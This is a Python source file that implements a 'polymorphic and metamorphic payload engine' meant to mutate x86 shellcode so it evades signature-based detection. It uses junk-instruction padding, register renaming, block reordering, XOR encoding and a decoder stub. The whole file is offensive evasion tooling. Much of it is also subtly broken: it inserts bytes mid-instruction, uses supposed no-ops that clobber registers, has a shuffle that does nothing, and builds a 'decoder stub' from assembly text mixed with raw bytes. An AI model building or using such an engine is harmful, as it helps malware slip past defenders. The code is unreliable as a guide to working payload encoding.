"""
Polymorphic and Metamorphic Payload Engine

Generates polymorphic and metamorphic payloads to evade signature-based detection.
Implements advanced code transformation techniques.
"""

import logging
import random
import struct
from typing import Any, Dict, List

logger = logging.getLogger(__name__)


class PolymorphicEngine:
    """
    Advanced polymorphic and metamorphic payload generation engine.
    
    Implements various code transformation techniques to create functionally
    equivalent but structurally different payloads.
    """

    def __init__(self):
        self.logger = logging.getLogger("IntellicrackLogger.PolymorphicEngine")

        # NOP equivalent instructions for padding
        self.nop_equivalents = [
            b'\x90',                    # nop
            b'\x40\x4A',               # inc eax; dec edx
            b'\x48\x40',               # dec eax; inc eax
            b'\x8B\xC0',               # mov eax, eax
            b'\x8B\xD2',               # mov edx, edx
            b'\x33\xC0\x33\xC0',       # xor eax, eax; xor eax, eax
            b'\x50\x58',               # push eax; pop eax
            b'\x51\x59',               # push ecx; pop ecx
            b'\x52\x5A',               # push edx; pop edx
            b'\x87\xC0',               # xchg eax, eax
        ]

        # Dead code templates for insertion
        self.dead_code_templates = [
            # Math operations that cancel out
            b'\x40\x48',               # inc eax; dec eax
            b'\x41\x49',               # inc ecx; dec ecx
            b'\x42\x4A',               # inc edx; dec edx
            b'\x83\xC0\x01\x83\xE8\x01',  # add eax, 1; sub eax, 1
            b'\x83\xC1\x02\x83\xE9\x02',  # add ecx, 2; sub ecx, 2

            # Stack operations that cancel out
            b'\x50\x58',               # push eax; pop eax
            b'\x51\x59',               # push ecx; pop ecx
            b'\x52\x5A',               # push edx; pop edx

            # Register shuffling
            b'\x50\x51\x59\x58',       # push eax; push ecx; pop ecx; pop eax
            b'\x87\xC1\x87\xC1',       # xchg eax, ecx; xchg eax, ecx
        ]

        # Garbage registers that can be modified without affecting payload
        self.garbage_registers = ['ebx', 'esi', 'edi']

    def encode_payload(self, payload: bytes, target_analysis: Dict[str, Any]) -> bytes:
        """
        Generate a polymorphic version of the payload.
        
        Args:
            payload: Original payload bytes
            target_analysis: Target environment analysis
            
        Returns:
            Polymorphically encoded payload
        """
        try:
            self.logger.info(f"Generating polymorphic payload for {len(payload)} bytes")

            # Choose encoding techniques based on target analysis
            techniques = self._select_encoding_techniques(target_analysis)

            encoded_payload = payload

            # Apply selected encoding techniques
            for technique in techniques:
                if technique == 'nop_insertion':
                    encoded_payload = self._insert_nop_equivalents(encoded_payload)
                elif technique == 'dead_code_insertion':
                    encoded_payload = self._insert_dead_code(encoded_payload)
                elif technique == 'instruction_substitution':
                    encoded_payload = self._substitute_instructions(encoded_payload)
                elif technique == 'register_renaming':
                    encoded_payload = self._rename_registers(encoded_payload)
                elif technique == 'code_reordering':
                    encoded_payload = self._reorder_code_blocks(encoded_payload)
                elif technique == 'garbage_insertion':
                    encoded_payload = self._insert_garbage_code(encoded_payload)

            self.logger.info(f"Polymorphic encoding complete: {len(payload)} -> {len(encoded_payload)} bytes")
            return encoded_payload

        except Exception as e:
            self.logger.error(f"Polymorphic encoding failed: {e}")
            return payload  # Return original payload if encoding fails

    def metamorphic_encode(self, payload: bytes, target_analysis: Dict[str, Any]) -> bytes:
        """
        Generate a metamorphic version of the payload.
        
        Metamorphic encoding creates functionally equivalent code that is
        structurally completely different from the original.
        
        Args:
            payload: Original payload bytes
            target_analysis: Target environment analysis
            
        Returns:
            Metamorphically encoded payload
        """
        try:
            self.logger.info(f"Generating metamorphic payload for {len(payload)} bytes")

            # Disassemble payload into functional blocks
            code_blocks = self._disassemble_payload(payload)

            # Transform each block independently
            transformed_blocks = []
            for block in code_blocks:
                transformed_block = self._metamorphic_transform_block(block)
                transformed_blocks.append(transformed_block)

            # Reassemble with additional obfuscation
            metamorphic_payload = self._reassemble_blocks(transformed_blocks)

            # Add final metamorphic touches
            metamorphic_payload = self._add_metamorphic_wrapper(metamorphic_payload)

            self.logger.info(f"Metamorphic encoding complete: {len(payload)} -> {len(metamorphic_payload)} bytes")
            return metamorphic_payload

        except Exception as e:
            self.logger.error(f"Metamorphic encoding failed: {e}")
            return self.encode_payload(payload, target_analysis)  # Fallback to polymorphic

    def _select_encoding_techniques(self, target_analysis: Dict[str, Any]) -> List[str]:
        """Select appropriate encoding techniques based on target analysis."""
        techniques = []

        # Base techniques always applied
        techniques.extend(['nop_insertion', 'dead_code_insertion'])

        # Add techniques based on evasion requirements
        evasion_reqs = target_analysis.get('evasion_requirements', [])

        if 'signature_evasion' in evasion_reqs:
            techniques.extend(['instruction_substitution', 'garbage_insertion'])

        if 'behavioral_evasion' in evasion_reqs:
            techniques.extend(['code_reordering', 'register_renaming'])

        # Randomize technique order
        random.shuffle(techniques)

        return techniques

    def _insert_nop_equivalents(self, payload: bytes) -> bytes:
        """Insert NOP-equivalent instructions throughout the payload."""
        result = b''

        for i, byte in enumerate(payload):
            result += bytes([byte])

            # Randomly insert NOP equivalents
            if random.random() < 0.1:  # 10% chance
                nop_equiv = random.choice(self.nop_equivalents)
                result += nop_equiv

        return result

    def _insert_dead_code(self, payload: bytes) -> bytes:
        """Insert dead code that doesn't affect payload execution."""
        result = b''

        for i in range(0, len(payload), 4):
            # Add original bytes
            chunk = payload[i:i+4]
            result += chunk

            # Randomly insert dead code
            if random.random() < 0.15:  # 15% chance
                dead_code = random.choice(self.dead_code_templates)
                result += dead_code

        return result

    def _substitute_instructions(self, payload: bytes) -> bytes:
        """Substitute instructions with equivalent alternatives."""
        result = bytearray(payload)

        # Define instruction substitutions
        substitutions = {
            b'\x90': random.choice(self.nop_equivalents),  # Replace NOP
            b'\x40': b'\x83\xC0\x01',  # inc eax -> add eax, 1
            b'\x48': b'\x83\xE8\x01',  # dec eax -> sub eax, 1
            b'\x41': b'\x83\xC1\x01',  # inc ecx -> add ecx, 1
            b'\x49': b'\x83\xE9\x01',  # dec ecx -> sub ecx, 1
        }

        # Apply substitutions
        for original, replacement in substitutions.items():
            if len(original) == 1 and len(replacement) >= 1:
                for i in range(len(result)):
                    if result[i:i+1] == original:
                        if random.random() < 0.3:  # 30% chance to substitute
                            # Simple substitution for single-byte instructions
                            if len(replacement) == 1:
                                result[i] = replacement[0]

        return bytes(result)

    def _rename_registers(self, payload: bytes) -> bytes:
        """Rename registers where possible to avoid signatures."""
        # This is a simplified version - real implementation would need
        # full disassembly and data flow analysis
        result = bytearray(payload)

        # Simple register renaming for specific patterns
        register_mappings = {
            # mov eax, imm32 -> mov ecx, imm32 (if eax not used elsewhere)
            b'\xB8': b'\xB9',  # mov eax -> mov ecx
            # push eax -> push ecx
            b'\x50': b'\x51',  # push eax -> push ecx
            # pop eax -> pop ecx
            b'\x58': b'\x59',  # pop eax -> pop ecx
        }

        for i in range(len(result)):
            if result[i:i+1] in register_mappings:
                if random.random() < 0.2:  # 20% chance to rename
                    result[i] = register_mappings[result[i:i+1]][0]

        return bytes(result)

    def _reorder_code_blocks(self, payload: bytes) -> bytes:
        """Reorder independent code blocks."""
        # Split payload into blocks (simplified approach)
        block_size = 8
        blocks = []

        for i in range(0, len(payload), block_size):
            block = payload[i:i+block_size]
            blocks.append(block)

        # Identify potentially reorderable blocks (very simplified)
        # In practice, this requires sophisticated control flow analysis
        reorderable_blocks = []
        non_reorderable_blocks = []

        for i, block in enumerate(blocks):
            # Heuristic: blocks without jumps/calls might be reorderable
            if b'\xE8' not in block and b'\xE9' not in block and b'\x74' not in block:
                reorderable_blocks.append((i, block))
            else:
                non_reorderable_blocks.append((i, block))

        # Randomly shuffle reorderable blocks
        if len(reorderable_blocks) > 1:
            random.shuffle([block for _, block in reorderable_blocks])

        # Reassemble
        result = b''
        for i in range(len(blocks)):
            if any(idx == i for idx, _ in non_reorderable_blocks):
                # Use original block
                result += blocks[i]
            elif reorderable_blocks:
                # Use shuffled block
                _, shuffled_block = reorderable_blocks.pop(0)
                result += shuffled_block
            else:
                result += blocks[i]

        return result

    def _insert_garbage_code(self, payload: bytes) -> bytes:
        """Insert garbage code using unused registers."""
        result = b''

        for i in range(0, len(payload), 6):
            # Add original bytes
            chunk = payload[i:i+6]
            result += chunk

            # Insert garbage code
            if random.random() < 0.12:  # 12% chance
                garbage = self._generate_garbage_code()
                result += garbage

        return result

    def _generate_garbage_code(self) -> bytes:
        """Generate garbage code that doesn't affect payload execution."""
        garbage_templates = [
            # Modify unused registers
            b'\x53\x5B',               # push ebx; pop ebx
            b'\x56\x5E',               # push esi; pop esi
            b'\x57\x5F',               # push edi; pop edi

            # Arithmetic on garbage registers
            b'\x43\x4B',               # inc ebx; dec ebx
            b'\x46\x4E',               # inc esi; dec esi
            b'\x47\x4F',               # inc edi; dec edi

            # XOR garbage with itself
            b'\x33\xDB',               # xor ebx, ebx
            b'\x33\xF6',               # xor esi, esi
            b'\x33\xFF',               # xor edi, edi

            # Move garbage between garbage registers
            b'\x8B\xDE',               # mov ebx, esi
            b'\x8B\xF7',               # mov esi, edi
            b'\x8B\xFB',               # mov edi, ebx
        ]

        return random.choice(garbage_templates)

    def _disassemble_payload(self, payload: bytes) -> List[Dict[str, Any]]:
        """Disassemble payload into functional blocks (simplified)."""
        # This is a very simplified disassembly for demonstration
        # Real implementation would use a proper disassembly library

        blocks = []
        current_block = {
            'start_offset': 0,
            'instructions': [],
            'dependencies': [],
            'type': 'linear'
        }

        i = 0
        while i < len(payload):
            # Detect potential instruction boundaries (simplified)
            byte = payload[i]

            # Check for control flow instructions
            if byte in [0xE8, 0xE9, 0x74, 0x75, 0xEB]:  # call, jmp, conditional jumps
                current_block['instructions'].append(payload[i:i+5])
                current_block['type'] = 'control_flow'
                i += 5

                # End current block
                blocks.append(current_block)
                current_block = {
                    'start_offset': i,
                    'instructions': [],
                    'dependencies': [],
                    'type': 'linear'
                }
            else:
                # Regular instruction (assume 1 byte for simplicity)
                current_block['instructions'].append(bytes([byte]))
                i += 1

        if current_block['instructions']:
            blocks.append(current_block)

        return blocks

    def _metamorphic_transform_block(self, block: Dict[str, Any]) -> Dict[str, Any]:
        """Apply metamorphic transformation to a code block."""
        transformed_block = block.copy()

        if block['type'] == 'linear':
            # Apply aggressive transformations to linear blocks
            instructions = block['instructions']

            # Insert decoy instructions
            new_instructions = []
            for instruction in instructions:
                new_instructions.append(instruction)

                # Insert decoy with 25% probability
                if random.random() < 0.25:
                    decoy = self._generate_decoy_instruction()
                    new_instructions.append(decoy)

            transformed_block['instructions'] = new_instructions

        return transformed_block

    def _generate_decoy_instruction(self) -> bytes:
        """Generate a decoy instruction that looks real but does nothing useful."""
        decoy_templates = [
            b'\x8B\xC0',               # mov eax, eax
            b'\x8B\xD2',               # mov edx, edx
            b'\x8B\xC9',               # mov ecx, ecx
            b'\x03\xC0',               # add eax, eax (effectively shl eax, 1)
            b'\x2B\xC0',               # sub eax, eax (effectively xor eax, eax)
            b'\x0B\xC0',               # or eax, eax
            b'\x23\xC0',               # and eax, eax
            b'\x85\xC0',               # test eax, eax
        ]

        return random.choice(decoy_templates)

    def _reassemble_blocks(self, blocks: List[Dict[str, Any]]) -> bytes:
        """Reassemble transformed blocks into final payload."""
        result = b''

        for block in blocks:
            for instruction in block['instructions']:
                result += instruction

        return result

    def _add_metamorphic_wrapper(self, payload: bytes) -> bytes:
        """Add metamorphic wrapper around the payload."""
        # Generate unique entry sequence
        entry_sequence = self._generate_entry_sequence()

        # Generate unique exit sequence
        exit_sequence = self._generate_exit_sequence()

        # Wrap payload
        wrapped_payload = entry_sequence + payload + exit_sequence

        return wrapped_payload

    def _generate_entry_sequence(self) -> bytes:
        """Generate a unique entry sequence for metamorphic wrapper."""
        sequences = [
            # Stack frame setup variations
            b'\x55\x8B\xEC',                           # push ebp; mov ebp, esp
            b'\x55\x89\xE5',                           # push ebp; mov ebp, esp (AT&T)
            b'\x50\x8B\xC4\x89\xC5\x58',               # push eax; mov eax, esp; mov ebp, eax; pop eax

            # Register preservation variations
            b'\x60',                                    # pushad
            b'\x50\x51\x52\x53',                       # push eax; push ecx; push edx; push ebx
            b'\x56\x57\x55',                           # push esi; push edi; push ebp
        ]

        return random.choice(sequences)

    def _generate_exit_sequence(self) -> bytes:
        """Generate a unique exit sequence for metamorphic wrapper."""
        sequences = [
            # Stack frame cleanup variations
            b'\x8B\xE5\x5D',                           # mov esp, ebp; pop ebp
            b'\x89\xEC\x5D',                           # mov esp, ebp; pop ebp (AT&T)
            b'\xC9',                                    # leave

            # Register restoration variations
            b'\x61',                                    # popad
            b'\x5B\x5A\x59\x58',                       # pop ebx; pop edx; pop ecx; pop eax
            b'\x5D\x5F\x5E',                           # pop ebp; pop edi; pop esi
        ]

        return random.choice(sequences)

    def generate_polymorphic_key(self) -> bytes:
        """Generate a random key for polymorphic encryption."""
        key_length = random.randint(16, 32)
        return bytes([random.randint(0, 255) for _ in range(key_length)])

    def xor_encode_with_key(self, payload: bytes, key: bytes) -> bytes:
        """XOR encode payload with given key."""
        encoded = bytearray()

        for i, byte in enumerate(payload):
            key_byte = key[i % len(key)]
            encoded.append(byte ^ key_byte)

        return bytes(encoded)

    def generate_decoder_stub(self, key: bytes, payload_length: int) -> bytes:
        """Generate decoder stub for XOR-encoded payload."""
        # Simple XOR decoder stub (x86)
        decoder = b'''
            ; XOR decoder stub
            push edi
            push ecx
            mov edi, $ + 0x20        ; Point to encoded payload
            mov ecx, ''' + struct.pack('<I', payload_length) + b'''
            
        decode_loop:
            xor byte ptr [edi], ''' + bytes([key[0]]) + b'''
            inc edi
            loop decode_loop
            
            pop ecx
            pop edi
            jmp $ + 0x05             ; Jump to decoded payload
        '''

        return decoder
